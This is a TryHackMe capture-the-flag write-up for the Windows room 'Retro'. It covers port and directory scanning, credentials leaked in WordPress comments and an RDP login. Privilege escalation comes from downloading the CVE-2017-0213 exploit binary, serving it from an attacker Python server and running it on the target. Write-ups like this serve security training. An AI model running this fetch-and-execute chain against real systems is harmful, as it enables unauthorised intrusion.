# Resolution Report: Room “Retro” (TryHackMe)

**Author:** stylishack
**Date:** 13th January 2026
**Target IP:** 10.66.188.222
**Attacker IP:** 10.66.87.33

## Introduction
This report details the methodology followed to solve the TryHackMe room “Retro”. This Windows machine features a retro-themed web server and is found to have unpatched vulnerabilities allowing for privilege escalation. The goal was to obtain both the user and root flags.

## Phase 1: Reconnaissance and Enumeration

The process began with a network scan to identify open ports and services on the target machine.

-   **Nmap Scan:**
    -   **Command:** `nmap -p 80,3389 -sC -sV -Pn 10.66.188.222` (Initial `nmap -p- --open -sS --min-rate 5000 -n -Pn` was used for fast port discovery).
    -   **Results:**
        ```text
        PORT      STATE SERVICE      VERSION
        80/tcp    open  http         Microsoft IIS httpd 10.0
        | http-methods:
        |_ Potentially risky methods: TRACE
        |_http-server-header: Microsoft-IIS/10.0
        |_http-title: IIS Windows Server
        3389/tcp  open  ms-wbt-server Microsoft Terminal Services
        | rdp-ntlm-info:
        | Target_Name: RETROWEB
        | NetBIOS_Domain_Name: RETROWEB
        | NetBIOS_Computer_Name: RETROWEB
        | DNS_Domain_Name: RetroWeb
        | DNS_Computer_Name: RetroWeb
        | Product_Version: 10.0.14393
        |_ System_Time: 2026-01-13T08:29:34+00:00
        | ssl-cert: Subject: commonName=RetroWeb
        | Not valid before: 2026-01-12T08:23:54
        |_Not valid after: 2026-07-14T08:23:54
        |_ssl-date: 2026-01-13T08:29:34+00:00; -1s from scanner time.
        Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
        ```
    -   **Key Findings:**
        *   Port 80 (HTTP) is open, running Microsoft IIS httpd 10.0, showing a default "IIS Windows Server" page. This indicated the actual web application was likely in a sub-directory.
        *   Port 3389 (RDP) is open, indicating a potential post-exploitation entry point if credentials could be found.

-   **Directory Brute-forcing:**
    -   **Tool:** Gobuster.
    -   **Command:** `gobuster dir -u http://10.66.188.222 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
    -   **Finding:** The brute-force scan revealed a hidden directory.
        ```text
        /retro (Status: 301) [Size: 149] [--> http://10.66.188.222/retro/]
        /Retro (Status: 301) [Size: 149] [-->
        ```
        The hidden directory where the website resides is `/retro`.

## Phase 2: Web Enumeration and Initial Access

With the hidden directory identified, the next step was to enumerate the web application and find credentials for initial access.

-   **Web Analysis:**
    -   **URL:** `http://10.66.188.222/retro`. This led to a WordPress site named "retro fanatics" about retro games, books, and movies.
    -   **User found:** By browsing the site, a recurring author named `Wade` was identified. His profile listed several posts.
    -   **Credentials found:** In the comments section of the "Ready Player One" post, a comment from `Wade` explicitly stated: "Leaving myself a note here just in case I forget how to spell it: parzival". This revealed the password.
        *   **Username:** `wade`
        *   **Password:** `parzival`

-   **Access:**
    -   **RDP Connection:** Using the discovered credentials, a connection to the machine via RDP (port 3389) was established.
        **Command:** `xfreerdp /u:wade /p:parzival /v:10.66.188.222`
    -   **User Flag:** Upon successful connection, the `user.txt` file was found on Wade's Desktop.
        **Flag Content:** 

## Phase 3: Privilege Escalation Analysis

Now logged in as `wade`, the next phase involved enumerating the system for privilege escalation opportunities to gain root access.

-   **Enumeration:**
    -   **Command:** `systeminfo` was executed in a command prompt on the target machine.
    -   **Findings:** The output of `systeminfo` revealed critical details:
        *   **OS Name:** Microsoft Windows Server 2016 Standard
        *   **OS Version:** 10.0.14393 N/A Build 14393
        *   **Hotfix(s):** Only 1 Hotfix installed: `KB3192137`.
        This confirmed the system was a Windows Server 2016 (released in 2016) with very few updates.

-   **Vulnerability Identification:**
    -   **Logic:** A Windows Server 2016 system with minimal patches is highly susceptible to privilege escalation vulnerabilities discovered between 2017 and the current date.
    -   **Identified Candidates:**
        *   Initial investigation also included `CVE-2019-1388` (Windows Certificate Dialog Elevation of Privilege), as evidence like `hhupd.exe` in the Recycle Bin and browser history pointed to it. However, graphical interface issues over RDP prevented its successful exploitation.
        *   A more robust approach was taken by identifying kernel-level vulnerabilities using the `systeminfo` output. Tools like `wesng` (Windows Exploit Suggester Next Generation) could be used to correlate the OS version and missing patches with known exploits. This led to `CVE-2017-0213` (Windows COM Elevation of Privilege) and `CVE-2016-7255` (Win32k Elevation of Privilege) as prime candidates due to their stability and availability of pre-compiled binaries.

## Phase 4: Exploitation (System Access)

Given the graphical interface issues with CVE-2019-1388 and the stability of kernel exploits, `CVE-2017-0213` was chosen for local privilege escalation.

-   **Method:** Local Privilege Escalation via `CVE-2017-0213` (Windows COM Elevation of Privilege Vulnerability). This exploit leverages a flaw in how Windows handles COM objects, allowing a low-privileged user to execute code with `NT AUTHORITY\SYSTEM` privileges.

-   **Actions:**
    -   **Download Exploit:** The pre-compiled `CVE-2017-0213_x64.exe` binary was obtained from a reliable source (SecWiki's GitHub repository for Windows kernel exploits) onto the attacker machine (Kali).
        **Command:**
        ```bash
        wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/CVE-2017-0213/CVE-2017-0213_x64.zip
        unzip CVE-2017-0213_x64.zip
        ```
    -   **Host Exploit:** A simple Python HTTP server was set up on the Kali machine to serve the exploit file.
        **Command:** `python3 -m http.server 8000`
    -   **Download to Target:** From the RDP session (Wade's desktop), Google Chrome was used to download the `CVE-2017-0213_x64.exe` file from the attacker's Python server to the victim's Downloads folder.
        **URL:** `http://10.66.87.33:8000/CVE-2017-0213_x64.exe`
    -   **Execution:** An administrative command prompt was opened on the victim machine. The directory was changed to where the exploit was downloaded (e.g., `cd Downloads`), and the exploit was executed by typing its name.
        **Command in Windows CMD:**
        ```cmd
        cd Downloads
        CVE-2017-0213_x64.exe
        ```

-   **Result:**
    -   Executing `CVE-2017-0213_x64.exe` spawned a new command prompt window on the victim's desktop.
    -   Executing `whoami` in this new command prompt confirmed that the current user was `nt authority\system`, indicating successful privilege escalation.

## Phase 5: Obtaining the Root Flag

With `NT AUTHORITY\SYSTEM` privileges, the final root flag was located.

-   **Actions:**
    -   From the elevated command prompt (SYSTEM shell), the `Administrator`'s Desktop was accessed.
    -   **Command:** `type C:\Users\Administrator\Desktop\root.txt.txt`
    -   **Root Flag:** 

## Conclusion
Solving the “Retro” room involved a comprehensive penetration testing process: starting with network and web enumeration to find hidden web applications and leaked credentials, followed by gaining initial access via RDP. The crucial phase was privilege escalation, which required identifying an outdated and unpatched Windows operating system and leveraging a known kernel vulnerability (`CVE-2017-0213`). The ability to adapt the exploitation strategy from a UI-dependent exploit to a more robust kernel exploit was key to achieving SYSTEM access and obtaining the root flag.

The overall path taken was:
**Web enumeration** (Gobuster, WordPress) -> **Credential leak** (WordPress comments) -> **RDP Access** (as `wade`) -> **System enumeration** (`systeminfo`) -> **Unpatched Kernel Exploit** (`CVE-2017-0213`) -> **SYSTEM access** -> **Root Flag retrieval**.
